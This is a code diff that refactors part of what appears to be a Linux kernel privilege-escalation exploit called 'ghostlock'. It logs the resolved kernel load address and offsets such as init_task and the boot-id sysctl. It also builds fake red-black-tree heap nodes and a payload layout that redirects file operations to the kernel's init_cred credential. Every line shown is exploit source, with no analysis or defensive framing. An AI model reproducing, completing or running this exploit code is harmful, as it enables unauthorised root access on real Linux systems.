@@ -114,10 +114,8 @@ namespace ghostlock::support {
                    "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
                    "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
                    getpid(), (unsigned long long)P0_PHYS_OFFSET,
-                   (unsigned long long)memory::resolved_addresses_kernel_phys_load(
-                       &g_exploit_session.addresses),
-                   (unsigned long long)(memory::resolved_addresses_kernel_phys_load(
-                           &g_exploit_session.addresses) -
+                   (unsigned long long)g_exploit_session.addresses.phys_load(),
+                   (unsigned long long)(g_exploit_session.addresses.phys_load() -
                        P0_PHYS_OFFSET),
                    (unsigned long long)SLIDE_NFULNL_LOGGER,
                    (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
@@ -152,10 +150,8 @@ namespace ghostlock::support {
 
     void init_p0_profile(void) {
         pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
-                (unsigned long long)memory::resolved_addresses_kernel_phys_load(
-                    &g_exploit_session.addresses),
-                (unsigned long long)(memory::resolved_addresses_kernel_phys_load(
-                        &g_exploit_session.addresses) -
+                (unsigned long long)g_exploit_session.addresses.phys_load(),
+                (unsigned long long)(g_exploit_session.addresses.phys_load() -
                     P0_PHYS_OFFSET));
     }
 
@@ -197,7 +193,7 @@ namespace ghostlock::support {
                 return 0;
             }
             put64(c, ref_offsets[i],
-                  memory::resolved_addresses_data_alias(&g_exploit_session.addresses, ref_images[i]));
+                  g_exploit_session.addresses.data_alias(ref_images[i]));
         }
         return 1;
     }
@@ -326,9 +322,7 @@ namespace ghostlock::support {
                 payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
         PayloadWriteLayout write_layout = payload_write_layout(
             request, base, default_fops, credential_fops,
-            memory::resolved_addresses_data_alias(&g_exploit_session.addresses,
-                                                  memory::resolved_addresses_init_cred_image(
-                                                      &g_exploit_session.addresses)));
+            g_exploit_session.addresses.data_alias(g_exploit_session.addresses.init_cred_image_addr()));
         (g_exploit_session.heap.current.fake_parent) = write_layout.parent;
         (g_exploit_session.heap.current.fake_right) = write_layout.right;
         (g_exploit_session.heap.current.fake_left) = write_layout.left;
